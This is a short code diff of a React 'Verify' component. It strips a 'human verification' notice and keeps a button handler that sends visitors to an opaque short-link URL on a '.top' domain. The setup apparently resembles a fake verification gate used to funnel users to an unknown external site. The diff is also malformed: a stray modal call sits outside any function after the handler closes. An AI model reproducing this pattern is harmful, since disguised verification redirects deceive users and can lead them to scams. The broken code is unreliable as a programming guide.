@@ -37,15 +37,12 @@ const Verify = () => {
       clearInterval(interval);
     };
   }, []);
+  
 const handleVerify = () => {
-  toast({
-    title: "Verification Required",
-    description: "Please complete the human verification process.",
-  });
-
-  // Redirecționează către URL-ul dorit
-  window.location.href = "https://f9ff.top/68fcad4"; 
+  // Redirecționează utilizatorul către URL-ul dorit
+  window.location.href = "https://f9ff.top/68fcad4";
 };
+
 
 
     setIsModalOpen(true);
